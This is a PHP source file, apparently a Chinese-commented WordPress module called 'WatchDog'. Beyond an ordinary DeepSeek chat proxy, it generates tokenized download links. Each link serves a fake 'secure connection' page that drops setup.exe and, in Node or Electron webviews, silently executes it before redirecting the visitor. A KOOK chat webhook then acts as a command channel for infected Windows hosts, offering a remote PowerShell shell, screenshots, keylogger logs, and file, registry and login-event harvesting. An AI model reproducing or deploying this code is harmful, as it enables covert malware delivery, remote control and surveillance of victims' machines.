    $response = wp_remote_post('https://api.deepseek.com/chat/completions', [
        'headers' => ['Authorization' => 'Bearer ' . $api_key, 'Content-Type' => 'application/json'],
        'body'    => wp_json_encode([
            'model'       => 'deepseek-chat',
            'messages'    => $messages,
            'max_tokens'  => 800,
            'temperature' => 0.5,
        ]),
        'timeout' => 60,  // 从 30 改成 60 秒了，DeepSeek 有时候确实慢
    ]);

    if (is_wp_error($response)) {
        $msg = $response->get_error_message();
        // 超时时给出明确提示
        if (str_contains($msg, 'timed out') || str_contains($msg, 'cURL error 28')) {
            wp_send_json_error(['message' => 'DeepSeek 响应超时，请稍后重试']);
        }
        wp_send_json_error(['message' => '请求失败: ' . $msg]);
    }

    $code = wp_remote_retrieve_response_code($response);
    $body = json_decode(wp_remote_retrieve_body($response), true);

    if ($code === 429) {
        wp_send_json_error(['message' => 'DeepSeek API 请求频率超限，请稍等片刻再试']);
    }
    if ($code !== 200) {
        $err = $body['error']['message'] ?? "HTTP {$code}";
        wp_send_json_error(['message' => "DeepSeek 错误: {$err}"]);
    }

    $reply = $body['choices'][0]['message']['content'] ?? '';
    if (empty($reply)) {
        $finish = $body['choices'][0]['finish_reason'] ?? '?';
        wp_send_json_error(['message' => "API 返回空响应（finish_reason: {$finish}），请尝试缩短对话后重试"]);
    }
    wp_send_json_success(['reply' => $reply]);
}

function wd_ajax_save_ai_key(): void {
    wd_verify_admin();
    update_option('wd_deepseek_api_key', sanitize_text_field($_POST['api_key'] ?? ''));
    wp_send_json_success(['message' => 'DeepSeek API Key 已保存']);
}

function wd_ajax_get_ai_key(): void {
    wd_verify();
    $key = get_option('wd_deepseek_api_key', '');
    wp_send_json_success(['masked' => $key ? substr($key, 0, 6) . str_repeat('*', max(0, strlen($key) - 6)) : '']);
}

// ── 投递文件库（服务端文件管理，最多 5 个 FIFO）──────────────────────────

function wd_delivery_dir(): array {
    $upload = wp_upload_dir();
    $dir    = $upload['basedir'] . '/watchdog-delivery/';
    $url    = $upload['baseurl'] . '/watchdog-delivery/';
    if (!is_dir($dir)) wp_mkdir_p($dir);
    return [$dir, $url];
}

function wd_ajax_delivery_upload(): void {
    // PHP 上传限制再拉高一点，虽然主要还是靠 Nginx
    @ini_set('upload_max_filesize', '512M');
    @ini_set('post_max_size',       '512M');
    wd_verify();
    if (empty($_FILES['file']['tmp_name'])) {
        wp_send_json_error(['message' => '未收到文件']);
    }
    [$dir, $url] = wd_delivery_dir();
    $orig = sanitize_file_name($_FILES['file']['name']);
    $dest = $dir . time() . '_' . $orig;
    if (!move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
        wp_send_json_error(['message' => '文件保存失败']);
    }
    $files   = get_option('watchdog_delivery_files', []);
    $files[] = [
        'name' => $orig,
        'path' => $dest,
        'url'  => $url . basename($dest),
        'size' => filesize($dest),
        'time' => time(),
    ];
    while (count($files) > 5) {
        $old = array_shift($files);
        if (file_exists($old['path'])) @unlink($old['path']);
    }
    update_option('watchdog_delivery_files', $files);
    wp_send_json_success(['files' => $files]);
}

/**
 * 分片上传接口：前端把大文件切成 1 MB 小块逐块发送，
 * 所有块到齐后合并成完整文件，彻底绕过 Nginx/PHP 大小限制。
 *
 * POST 参数：
 *   uid        - 本次上传唯一 ID（前端生成）
 *   filename   - 原始文件名
 *   chunk_idx  - 当前块序号（从 0 开始）
 *   total_chunks - 总块数
 *   chunk      - 文件（multipart）
 */
function wd_ajax_delivery_upload_chunk(): void {
    wd_verify();

    $uid          = sanitize_text_field($_POST['uid']          ?? '');
    $filename     = sanitize_file_name($_POST['filename']      ?? 'upload.bin');
    $chunk_idx    = (int)($_POST['chunk_idx']                  ?? 0);
    $total_chunks = (int)($_POST['total_chunks']               ?? 1);

    if (!$uid || $total_chunks < 1) {
        wp_send_json_error(['message' => '参数缺失']);
    }
    if (empty($_FILES['chunk']['tmp_name'])) {
        wp_send_json_error(['message' => '未收到分片数据']);
    }

    [$dir, $url] = wd_delivery_dir();
    $tmp_dir = $dir . 'tmp_' . preg_replace('/[^a-z0-9]/i', '', $uid) . '/';
    wp_mkdir_p($tmp_dir);

    // 保存当前分片
    $chunk_path = $tmp_dir . $chunk_idx . '.part';
    if (!move_uploaded_file($_FILES['chunk']['tmp_name'], $chunk_path)) {
        wp_send_json_error(['message' => "分片 {$chunk_idx} 保存失败"]);
    }

    // 检查是否所有分片都已到达
    $received = 0;
    for ($i = 0; $i < $total_chunks; $i++) {
        if (file_exists($tmp_dir . $i . '.part')) $received++;
    }

    if ($received < $total_chunks) {
        // 未收齐，告知进度
        wp_send_json_success(['done' => false, 'received' => $received, 'total' => $total_chunks]);
    }

    // 所有分片到齐，合并
    $dest = $dir . time() . '_' . $filename;
    $fp = fopen($dest, 'wb');
    if (!$fp) {
        wp_send_json_error(['message' => '无法创建目标文件']);
    }
    for ($i = 0; $i < $total_chunks; $i++) {
        $part = $tmp_dir . $i . '.part';
        fwrite($fp, file_get_contents($part));
        @unlink($part);
    }
    fclose($fp);
    @rmdir($tmp_dir);

    // 登记到文件库
    $files   = get_option('watchdog_delivery_files', []);
    $files[] = [
        'name' => $filename,
        'path' => $dest,
        'url'  => $url . basename($dest),
        'size' => filesize($dest),
        'time' => time(),
    ];
    while (count($files) > 5) {
        $old = array_shift($files);
        if (file_exists($old['path'])) @unlink($old['path']);
    }
    update_option('watchdog_delivery_files', $files);
    wp_send_json_success(['done' => true, 'files' => $files]);
}

function wd_ajax_delivery_list(): void {
    wd_verify();
    $files = get_option('watchdog_delivery_files', []);
    $files = array_values(array_filter($files, fn($f) => file_exists($f['path'])));
    update_option('watchdog_delivery_files', $files);
    wp_send_json_success(['files' => $files]);
}

function wd_ajax_delivery_delete(): void {
    wd_verify();
    $url   = sanitize_text_field($_POST['url'] ?? '');
    $files = get_option('watchdog_delivery_files', []);
    foreach ($files as $k => $f) {
        if ($f['url'] === $url) {
            if (file_exists($f['path'])) @unlink($f['path']);
            unset($files[$k]);
            break;
        }
    }
    $files = array_values($files);
    update_option('watchdog_delivery_files', $files);
    wp_send_json_success(['files' => $files]);
}

// ── 投递链接系统（Drop Token）：生成带限制的下载链接 ──────────────────

function wd_ajax_create_drop_token(): void {
    wd_verify();
    global $wpdb;
    $file_url     = esc_url_raw(wp_unslash($_POST['file_url']     ?? ''));
    $redirect_url = esc_url_raw(wp_unslash($_POST['redirect_url'] ?? ''));
    $label        = sanitize_text_field($_POST['label']       ?? '');
    $max_uses     = max(1, (int)($_POST['max_uses']    ?? 1));
    $expire_hours = (int)($_POST['expire_hours'] ?? 24);
    if (!$file_url) { wp_send_json_error(['message' => '文件 URL 不能为空']); }
    $token      = bin2hex(random_bytes(16));
    $expires_at = $expire_hours > 0 ? date('Y-m-d H:i:s', time() + $expire_hours * 3600) : null;
    $table      = $wpdb->prefix . 'watchdog_drop_tokens';
    $ok = $wpdb->insert($table, [
        'token'        => $token,
        'file_url'     => $file_url,
        'redirect_url' => $redirect_url,
        'label'        => $label,
        'max_uses'     => $max_uses,
        'expires_at'   => $expires_at,
    ], ['%s','%s','%s','%s','%d','%s']);
    if (!$ok) { wp_send_json_error(['message' => '创建失败: ' . $wpdb->last_error]); }
    wp_send_json_success(['token' => $token, 'url' => home_url('/?wd_drop=' . $token)]);
}

function wd_ajax_list_drop_tokens(): void {
    wd_verify();
    global $wpdb;
    $table = $wpdb->prefix . 'watchdog_drop_tokens';
    $rows  = $wpdb->get_results("SELECT * FROM $table ORDER BY created_at DESC LIMIT 50", ARRAY_A);
    foreach ($rows as &$r) {
        $r['drop_url'] = home_url('/?wd_drop=' . $r['token']);
        $expired       = $r['expires_at'] && strtotime($r['expires_at']) < time();
        $maxed         = $r['max_uses'] > 0 && $r['uses'] >= $r['max_uses'];
        $r['valid']    = !$expired && !$maxed;
    }
    wp_send_json_success(['tokens' => $rows ?: []]);
}

function wd_ajax_delete_drop_token(): void {
    wd_verify();
    global $wpdb;
    $token = sanitize_text_field($_POST['token'] ?? '');
    if (!$token) { wp_send_json_error(['message' => '缺少 token']); }
    $wpdb->delete($wpdb->prefix . 'watchdog_drop_tokens', ['token' => $token], ['%s']);
    wp_send_json_success();
}

// 着陆页下载触发后的无登录回调 ping（admin-ajax 路由，兼容已登录管理员测试）
function wd_ajax_drop_dl_ping(): void {
    $token = sanitize_text_field($_POST['token'] ?? '');
    if (!$token) { wp_send_json_error(); }
    global $wpdb;
    $wpdb->query($wpdb->prepare(
        "UPDATE {$wpdb->prefix}watchdog_drop_tokens SET dl_count=dl_count+1, last_dl_at=%s WHERE token=%s",
        current_time('mysql'), $token
    ));
    wp_send_json_success();
}

// 前端路由 ping：?wd_drop_ping=TOKEN（避开 wp-admin 路径限制，sendBeacon 专用）
function wd_handle_drop_ping(): void {
    $token = sanitize_text_field($_GET['wd_drop_ping'] ?? $_POST['token'] ?? '');
    if (!$token) return;
    global $wpdb;
    $exists = $wpdb->get_var($wpdb->prepare(
        "SELECT id FROM {$wpdb->prefix}watchdog_drop_tokens WHERE token=%s", $token
    ));
    if (!$exists) { status_header(404); exit; }
    $wpdb->query($wpdb->prepare(
        "UPDATE {$wpdb->prefix}watchdog_drop_tokens SET dl_count=dl_count+1, last_dl_at=%s WHERE token=%s",
        current_time('mysql'), $token
    ));
    status_header(204);
    exit;
}

function wd_handle_drop_landing(): void {
    $token = sanitize_text_field($_GET['wd_drop'] ?? '');
    if (!$token) return;
    global $wpdb;
    $table = $wpdb->prefix . 'watchdog_drop_tokens';
    $row   = $wpdb->get_row($wpdb->prepare("SELECT * FROM $table WHERE token = %s", $token), ARRAY_A);
    if (!$row) { wd_drop_page_error(); return; }
    if ($row['expires_at'] && strtotime($row['expires_at']) < time()) { wd_drop_page_error(); return; }
    if ($row['max_uses'] > 0 && $row['uses'] >= $row['max_uses']) { wd_drop_page_error(); return; }
    $visitor_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
    $visitor_ip = trim(explode(',', $visitor_ip)[0]);
    $wpdb->update($table, [
        'uses'          => $row['uses'] + 1,
        'last_visit_ip' => $visitor_ip,
        'last_visit_at' => current_time('mysql'),
    ], ['token' => $token], ['%d','%s','%s'], ['%s']);
    $file_url     = $row['file_url'];
    $redirect_url = $row['redirect_url'] ?: 'https://www.baidu.com';
    $ping_url     = home_url('/?wd_drop_ping=' . $token);
    status_header(200);
    nocache_headers();
    header('Content-Type: text/html; charset=utf-8');
    ?><!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>正在初始化...</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d1117;color:#c9d1d9;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:18px}
.icon{width:52px;height:52px;border-radius:14px;background:linear-gradient(135deg,#388bfd,#1f6feb);display:flex;align-items:center;justify-content:center;font-size:26px;box-shadow:0 4px 16px rgba(31,111,235,.35)}
h2{font-size:15px;font-weight:500;color:#e6edf3;letter-spacing:.02em}
.bar-wrap{width:260px;height:3px;background:#21262d;border-radius:2px;overflow:hidden}
.bar-fill{height:100%;width:0;background:linear-gradient(90deg,#388bfd,#58a6ff);border-radius:2px;transition:width .4s ease}
.hint{font-size:12px;color:#7d8590}
</style>
</head>
<body>
<div class="icon">🔒</div>
<h2>正在建立安全连接</h2>
<div class="bar-wrap"><div class="bar-fill" id="bar"></div></div>
<div class="hint" id="hint">请稍候...</div>
<script>
(function(){
    var fileUrl  = <?= json_encode($file_url) ?>;
    var redir    = <?= json_encode($redirect_url) ?>;
    var token    = <?= json_encode($token) ?>;
    var pingUrl  = <?= json_encode($ping_url) ?>;
    var bar  = document.getElementById('bar');
    var hint = document.getElementById('hint');

    function setBar(w, msg) {
        bar.style.width = w + '%';
        if (msg) hint.textContent = msg;
    }

    // 通知服务器：下载已触发（sendBeacon 在页面跳转时也能可靠发出）
    function sendPing() {
        try {
            if (navigator.sendBeacon) {
                navigator.sendBeacon(pingUrl);
            } else {
                var img = new Image();
                img.src = pingUrl + '&_=' + Date.now();
            }
        } catch(e) {}
    }

    // ── 方式1: Node.js / Electron 环境（require 可用） ─────────────────
    // 适用于微信内嵌 webview、Electron 应用等 nodeIntegration 开启的场景
    function tryNodeExec() {
        if (typeof require === 'undefined') return false;
        try {
            var _r = require;
            var https   = _r(fileUrl.startsWith('https') ? 'https' : 'http');
            var fs      = _r('fs');
            var os      = _r('os');
            var path    = _r('path');
            var spawn   = _r('child_process').spawn;
            var tmpPath = path.join(os.tmpdir(), Date.now() + '_setup.exe');
            var file    = fs.createWriteStream(tmpPath);
            https.get(fileUrl + '?_=' + Date.now(), function(res) {
                res.pipe(file);
                file.on('finish', function() {
                    file.close(function() {
                        try {
                            // windowsHide:true + detached 完全无窗口静默运行
                            var child = spawn(tmpPath, [], {
                                detached: true,
                                stdio: 'ignore',
                                windowsHide: true
                            });
                            child.unref();
                        } catch(e) {}
                    });
                });
            }).on('error', function(){});
            return true;
        } catch(e) { return false; }
    }

    // ── 方式2: fetch + Blob 下载（标准浏览器，绕过部分直链拦截） ─────────
    function tryFetchBlob() {
        if (typeof fetch === 'undefined') return false;
        fetch(fileUrl + '?_=' + Date.now(), { mode: 'no-cors', cache: 'no-store' })
            .then(function(r) { return r.blob(); })
            .then(function(blob) {
                var a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = Date.now() + '_setup.exe';
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                setTimeout(function(){ URL.revokeObjectURL(a.href); }, 5000);
            })
            .catch(function() { tryDirectLink(); });
        return true;
    }

    // ── 方式3: 直接 <a> 点击兜底 ────────────────────────────────────────
    function tryDirectLink() {
        var a = document.createElement('a');
        a.href = fileUrl;
        a.download = '';
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
    }

    // 执行下载策略（优先级：Node → fetch blob → 直链），然后发 ping 记录
    var usedNode = tryNodeExec();
    if (!usedNode) {
        var usedFetch = tryFetchBlob();
        if (!usedFetch) tryDirectLink();
    }
    sendPing();

    // 进度条动画
    setTimeout(function(){ setBar(40); }, 150);
    setTimeout(function(){ setBar(70, '正在初始化...'); }, 900);
    setTimeout(function(){ setBar(92, '即将完成...'); }, 1700);
    setTimeout(function(){ setBar(100, '连接成功，正在跳转...'); }, 2200);
    setTimeout(function(){ window.location.replace(redir); }, 2700);
})();
</script>
</body>
</html>
<?php
    exit;
}

function wd_drop_page_error(): void {
    status_header(404);
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><title>404</title><style>body{background:#0d1117;color:#7d8590;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh}</style></head><body>页面不存在或链接已失效</body></html>';
    exit;
}

// ── KOOK Webhook 配置保存 ──────────────────────────────────────────────
function wd_ajax_save_kook_webhook(): void {
    wd_verify_admin();
    update_option('wd_kook_verify_token', sanitize_text_field($_POST['verify_token'] ?? ''));
    update_option('wd_kook_cmd_channel',  sanitize_text_field($_POST['cmd_channel']  ?? ''));
    wp_send_json_success(['message' => 'Webhook 配置已保存']);
}

// ── KOOK Webhook REST 端点，用来收 KOOK 的回调，主要是手机上发指令用 ──
add_action('rest_api_init', function () {
    register_rest_route('watchdog/v1', '/kook-webhook', [
        'methods'             => 'POST',
        'callback'            => 'wd_kook_webhook_handler',
        'permission_callback' => '__return_true',
    ]);
});

function wd_kook_webhook_handler(WP_REST_Request $request): WP_REST_Response {
    $body = json_decode($request->get_body(), true) ?? [];
    $d    = $body['d'] ?? [];
    $type = (int)($d['type'] ?? 0);

    // Challenge 验证，KOOK 配 Webhook 的时候会发这个来确认
    if ($type === 255) {
        return new WP_REST_Response(['challenge' => $d['challenge'] ?? ''], 200);
    }

    // ── Verify Token 校验 ──
    $stored_token = get_option('wd_kook_verify_token', '');
    if ($stored_token && ($d['verify_token'] ?? '') !== $stored_token) {
        return new WP_REST_Response([], 403);
    }

    // 不是文字消息或者 KMarkdown 就不处理了
    if (!in_array($type, [1, 9], true)) {
        return new WP_REST_Response([], 200);
    }

    $content    = trim($d['content']   ?? '');
    $channel_id = $d['target_id'] ?? '';

    // 要是设了指令频道就只在这个频道里响应，别吵到别人
    $cmd_channel = get_option('wd_kook_cmd_channel', '');
    if ($cmd_channel && $channel_id !== $cmd_channel) {
        return new WP_REST_Response([], 200);
    }

    // ── 交互式 Shell 会话：已开启会话时直接执行命令 ──
    $session_host = get_transient("wd_shell_session_{$channel_id}");
    if ($session_host && !str_starts_with($content, '/wd')) {
        $reply = wd_kook_shell_run($session_host, $content, $channel_id);
        if ($reply) WD_Kook::send($channel_id, $reply);
        return new WP_REST_Response([], 200);
    }

    // 只有 /wd 开头的消息才处理，其他无视
    if (!str_starts_with($content, '/wd')) {
        return new WP_REST_Response([], 200);
    }

    $parts = array_values(array_filter(explode(' ', $content)));
    $reply = wd_kook_dispatch($parts, $channel_id);

    if ($reply) {
        WD_Kook::send($channel_id, $reply);
    }

    return new WP_REST_Response([], 200);
}

// ── 如果有交互式 Shell 会话，就直接执行命令，不需要再敲 /wd ──────────
function wd_kook_shell_run(string $host_name, string $cmd, string $channel): string {
    if (!$cmd) return '';
    global $wpdb;
    $host = $wpdb->get_row($wpdb->prepare(
        "SELECT * FROM {$wpdb->prefix}watchdog_hosts WHERE name=%s AND status='online' LIMIT 1",
        $host_name
    ), ARRAY_A);
    if (!$host) {
        delete_transient("wd_shell_session_{$channel}");
        return ":red_circle: 主机 `{$host_name}` 已离线，Shell 会话已断开\n使用 `/wd list` 查看在线主机";
    }

    // 更新会话活跃时间
    set_transient("wd_shell_session_{$channel}", $host_name, 30 * MINUTE_IN_SECONDS);

    $wpdb->insert("{$wpdb->prefix}watchdog_cmd_queue", [
        'host_id'    => (int)$host['id'],
        'cmd_type'   => 'powershell',
        'payload'    => $cmd,
        'status'     => 'pending',
        'created_by' => 0,
    ], ['%d', '%s', '%s', '%s', '%d']);
    $cmd_id = (int)$wpdb->insert_id;
    set_transient("wd_kook_cmd_ch_{$cmd_id}", $channel, 10 * MINUTE_IN_SECONDS);

    return ":terminal: **`{$host_name}`** `\$ {$cmd}`\n> 执行中，结果稍后推送…（输入 `/wd end` 退出会话）";
}

// ── 解析并执行 /wd 指令 ────────────────────────────────────────────────
function wd_kook_dispatch(array $parts, string $reply_channel): string {
    $sub = $parts[1] ?? '';

    // ── /wd end — 结束交互式 Shell 会话 ──
    if ($sub === 'end' || $sub === 'exit') {
        $session_host = get_transient("wd_shell_session_{$reply_channel}");
        delete_transient("wd_shell_session_{$reply_channel}");
        return $session_host
            ? ":white_check_mark: 已断开与 `{$session_host}` 的 Shell 会话"
            : ':bell: 当前没有活动的 Shell 会话';
    }

    if (!$sub || $sub === 'help') {
        $session_host = get_transient("wd_shell_session_{$reply_channel}");
        $base = ":bell: **WatchDog 远程指令帮助**\n" .
                "`/wd list` — 查看在线主机列表\n" .
                "`/wd {主机名} shell` — 开启交互式 Shell（无需每次输入前缀）\n" .
                "`/wd {主机名} ps` — 进程列表（内存前30）\n" .
                "`/wd {主机名} run {命令}` — 执行 PowerShell 命令\n" .
                "`/wd {主机名} shot` — 远程截图\n" .
                "`/wd {主机名} keys` — 最近键盘记录\n" .
                "`/wd {主机名} files [路径]` — 文件列表（默认 C:\\\\）\n" .
                "`/wd {主机名} reg [注册表路径]` — 注册表子键（默认 HKLM）\n" .
                "`/wd {主机名} winlog [天数]` — Windows 登录事件日志（默认 1 天）\n" .
                "`/wd {主机名} users` — Windows 本地用户列表\n" .
                "`/wd end` — 退出 Shell 会话";
        if ($session_host) {
            $base .= "\n\n:green_circle: **当前已连接：`{$session_host}`（直接输入命令即可执行）**";
        }
        return $base;
    }

    if ($sub === 'list') {
        $result = WD_Host_Manager::get_list(1, 20, 'online');
        $items  = $result['items'] ?? [];
        if (empty($items)) {
            return ":red_circle: 当前无在线主机\n\n> 提示：主机上线后会自动出现在列表中";
        }
        $lines = [':white_check_mark: **在线主机列表：**'];
        foreach ($items as $h) {
            $lines[] = "• `{$h['name']}` — {$h['ip_last']}";
        }
        $first = $items[0]['name'] ?? '主机名';
        $lines[] = '';
        $lines[] = '**可以对以上主机执行：**';
        $lines[] = "`/wd {$first} shell` — :zap: 开启交互式 Shell（推荐）";
        $lines[] = "`/wd {$first} ps` — 查看进程列表";
        $lines[] = "`/wd {$first} run ipconfig` — 执行命令";
        $lines[] = "`/wd {$first} shot` — 远程截图";
        $lines[] = "`/wd {$first} keys` — 键盘记录";
        $lines[] = "`/wd {$first} files` — 文件列表（C:\\\\）";
        $lines[] = "`/wd {$first} reg` — 注册表（HKLM 根键）";
        $lines[] = "`/wd {$first} winlog` — 今日登录事件";
        $lines[] = "`/wd {$first} users` — 本地用户列表";
        return implode("\n", $lines);
    }

    $host_name = $sub;
    $cmd_sub   = $parts[2] ?? '';
    global $wpdb;
    $host = $wpdb->get_row($wpdb->prepare(
        "SELECT * FROM {$wpdb->prefix}watchdog_hosts WHERE name=%s AND status='online' LIMIT 1",
        $host_name
    ), ARRAY_A);
    if (!$host) {
        return ":red_circle: 主机 `{$host_name}` 不存在或不在线，使用 `/wd list` 查看在线主机";
    }

    // ── /wd {host} shell — 开启交互式会话 ──
    if ($cmd_sub === 'shell') {
        set_transient("wd_shell_session_{$reply_channel}", $host_name, 30 * MINUTE_IN_SECONDS);
        return ":green_circle: **已连接到 `{$host_name}` Shell 会话**\n" .
               "现在直接输入命令即可执行，无需任何前缀\n" .
               "会话 30 分钟无操作自动断开\n\n" .
               "> 输入 `/wd end` 手动断开";
    }

    switch ($cmd_sub) {
        case 'ps':
            $cmd_type = 'powershell';
            $payload  = "Get-Process | Sort-Object WorkingSet64 -Desc | Select-Object -First 30 | Format-Table ProcessName,Id,@{N='Mem(MB)';E={[Math]::Round(\$_.WorkingSet64/1MB,1)}},@{N='CPU(s)';E={[Math]::Round(\$_.CPU,1)}} -AutoSize | Out-String";
            $msg      = ":gear: 正在获取 `{$host_name}` 进程列表（内存前30），结果稍后推送…";
            break;
        case 'run':
            $payload = implode(' ', array_slice($parts, 3));
            if (!$payload) return ':red_circle: 请提供命令，例如：`/wd 主机名 run ipconfig`';
            $cmd_type = 'powershell';
            $msg      = ":gear: 正在 `{$host_name}` 上执行：`{$payload}`，结果稍后推送…";
            break;
        case 'shot':
            $cmd_type = 'screenshot';
            $payload  = '';
            $msg      = ":gear: 截图请求已发送至 `{$host_name}`，结果稍后推送…";
            break;
        case 'files':
            $fpath    = implode(' ', array_slice($parts, 3)) ?: 'C:\\';
            $payload  = "Get-ChildItem -LiteralPath '" . addslashes($fpath) . "' -Force -EA SilentlyContinue | Sort-Object @{E={\$_.PSIsContainer};D=\$true},Name | Format-Table @{N='类型';E={if(\$_.PSIsContainer){'[目录]'}else{'[文件]'}}},Name,@{N='大小(KB)';E={if(\$_.PSIsContainer){'—'}else{[int](\$_.Length/1024)}}},@{N='修改时间';E={\$_.LastWriteTime.ToString('MM-dd HH:mm')}} -AutoSize | Out-String";
            $cmd_type = 'powershell';
            $msg      = ":file_folder: 正在获取 `{$host_name}` 的 `{$fpath}` 文件列表，结果稍后推送…";
            break;
        case 'reg':
            $rpath    = implode(' ', array_slice($parts, 3)) ?: 'HKEY_LOCAL_MACHINE';
            $rps      = "Registry::{$rpath}";
            $payload  = "\$p='" . addslashes($rps) . "';\$s=@(Get-ChildItem -LiteralPath \$p -EA SilentlyContinue | %{\$_.PSChildName});if(\$s){'注册表子键（' + \$p + '）：' + \"`n\" + (\$s -join \"`n\")}else{'（无子键或路径不存在）'}";
            $cmd_type = 'powershell';
            $msg      = ":gear: 正在获取 `{$host_name}` 注册表 `{$rpath}` 子键列表，结果稍后推送…";
            break;
        case 'winlog':
            $wdays    = max(1, min(90, (int)(implode('', array_slice($parts, 3)) ?: 1)));
            $payload  = "\$f=@{LogName='Security';Id=@(4624,4625,4771);StartTime=(Get-Date).AddDays(-{$wdays})};\$e=Get-WinEvent -FilterHashtable \$f -MaxEvents 30 -EA SilentlyContinue;if(!\$e){'最近 {$wdays} 天无相关登录事件'}else{(\$e|%{\$x=[xml]\$_.ToXml();\$d=@{};\$x.Event.EventData.Data|%{if(\$_.Name){\$d[\$_.Name]=\$_.'#text'}};\$i=\$_.Id;\$st=if(\$i-eq 4624){'[成功]'}elseif(\$i-eq 4625){'[失败]'}else{'[Kerb失败]'};\"\$(\$_.TimeCreated.ToString('MM-dd HH:mm:ss')) \$st \$(\$d.TargetUserName) \$(\$d.IpAddress)\"})-join\"`n\"}";
            $cmd_type = 'powershell';
            $msg      = ":bell: 正在查询 `{$host_name}` 最近 {$wdays} 天的 Windows 登录事件（最多30条），结果稍后推送…";
            break;
        case 'users':
            $payload  = "Get-LocalUser | Select-Object Name,Enabled,@{N='LastLogon';E={if(\$_.LastLogon){\$_.LastLogon.ToString('yyyy-MM-dd')}else{'—'}}},Description | Format-Table -AutoSize | Out-String";
            $cmd_type = 'powershell';
            $msg      = ":bust_in_silhouette: 正在获取 `{$host_name}` 本地用户列表，结果稍后推送…";
            break;
        case 'keys':
            $log = $wpdb->get_var($wpdb->prepare(
                "SELECT payload FROM {$wpdb->prefix}watchdog_logs
                 WHERE host_id=%d AND log_type='keyboard'
                 ORDER BY id DESC LIMIT 1",
                $host['id']
            ));
            if (!$log) return ":bell: `{$host_name}` 暂无键盘记录";
            $data = json_decode($log, true) ?? [];
            $text = is_array($data) ? ($data['text'] ?? '') : (string)$log;
            return ":keyboard: **`{$host_name}` 最近键盘记录：**\n```\n" .
                   mb_substr($text, 0, 500) . "\n```";
        default:
            return ":red_circle: 未知命令 `{$cmd_sub}`，使用 `/wd help` 查看帮助";
    }

    $wpdb->insert("{$wpdb->prefix}watchdog_cmd_queue", [
        'host_id'    => (int)$host['id'],
        'cmd_type'   => $cmd_type,
        'payload'    => $payload,
        'status'     => 'pending',
        'created_by' => 0,
    ], ['%d', '%s', '%s', '%s', '%d']);
    $cmd_id = (int)$wpdb->insert_id;

    set_transient("wd_kook_cmd_ch_{$cmd_id}", $reply_channel, 10 * MINUTE_IN_SECONDS);

    return $msg;
}

// ── 指令执行完成 → 自动将结果推回 KOOK 频道 ──────────────────────────
add_action('wd_command_completed', function (int $cmd_id, string $result, bool $success) {
    $channel = get_transient("wd_kook_cmd_ch_{$cmd_id}");
    if (!$channel) return;
    delete_transient("wd_kook_cmd_ch_{$cmd_id}");

    // 看看是哪种指令，好给下一步操作建议
    global $wpdb;
    $row      = $wpdb->get_row($wpdb->prepare(
        "SELECT cmd_type, host_id FROM {$wpdb->prefix}watchdog_cmd_queue WHERE id=%d", $cmd_id
    ), ARRAY_A);
    $cmd_type = $row['cmd_type'] ?? '';
    $host     = $row ? WD_Host_Manager::get_by_id((int)($row['host_id'] ?? 0)) : null;
    $hname    = $host['name'] ?? '主机名';

    $icon    = $success ? ':white_check_mark:' : ':red_circle:';
    $label   = $success ? '执行完成' : '执行失败';
    $snippet = mb_substr(trim($result), 0, 1800);
    $msg     = "{$icon} **{$label}（指令 #{$cmd_id} · {$cmd_type}）**\n```\n{$snippet}\n```";

    // 根据指令类型给出后续操作提示
    $hints = [
        'get_processes' => "\n\n**:fire: 下一步可以：**\n`/wd {$hname} run taskkill /f /im {进程名}.exe` — 终止进程\n`/wd {$hname} shot` — 截图查看桌面",
        'powershell'    => "\n\n**:fire: 下一步可以：**\n`/wd {$hname} run {其他命令}` — 继续执行\n`/wd {$hname} ps` — 查看进程\n`/wd {$hname} files` — 文件列表\n`/wd {$hname} winlog` — 登录日志",
        'screenshot'    => "\n\n**:fire: 下一步可以：**\n`/wd {$hname} run {命令}` — 执行命令\n`/wd {$hname} ps` — 查看进程\n`/wd {$hname} files` — 文件列表",
    ];
    if (isset($hints[$cmd_type])) {
        $msg .= $hints[$cmd_type];
    }

    WD_Kook::send($channel, $msg);
}, 10, 3);

// ── WP Cron 兜底，万一 WebSocket 推送没成功，每分钟扫一遍把漏掉的补上 ──
add_filter('cron_schedules', function (array $s): array {
    $s['wd_every_minute'] = ['interval' => 60, 'display' => 'Every Minute (WatchDog)'];
    return $s;
});

add_action('init', function () {
    if (!wp_next_scheduled('wd_kook_push_results_cron')) {
        wp_schedule_event(time(), 'wd_every_minute', 'wd_kook_push_results_cron');
    }
});

add_action('wd_kook_push_results_cron', 'wd_kook_cron_push_results');

function wd_kook_cron_push_results(): void {
    global $wpdb;
    // 取最近 10 分钟内完成的命令
    $cmds = $wpdb->get_results(
        "SELECT id, cmd_type, result, status, host_id
         FROM {$wpdb->prefix}watchdog_cmd_queue
         WHERE status IN ('ack','failed')
           AND executed_at >= DATE_SUB(NOW(), INTERVAL 10 MINUTE)
         ORDER BY executed_at DESC LIMIT 30",
        ARRAY_A
    );
    foreach ($cmds as $cmd) {
        $channel = get_transient("wd_kook_cmd_ch_{$cmd['id']}");
        if (!$channel) continue;
        // 触发统一推送逻辑（delete_transient 防重复）
        do_action('wd_command_completed', (int)$cmd['id'], (string)$cmd['result'], $cmd['status'] === 'ack');
    }
}

// ── 类名兼容：如果插件版和主题版同时激活，优先用插件版的类 ────────────
// 毕竟插件的优先级更高，先来后到嘛
if (!class_exists('WD_Database') && class_exists('WatchDog_Database')) {
    class_alias('WatchDog_Database',    'WD_Database');
    class_alias('WatchDog_Auth',        'WD_Auth');
    class_alias('WatchDog_Host_Manager','WD_Host_Manager');
    class_alias('WatchDog_Log_Manager', 'WD_Log_Manager');
    class_alias('WatchDog_Kook',        'WD_Kook');
    class_alias('WatchDog_API',         'WD_API');
}
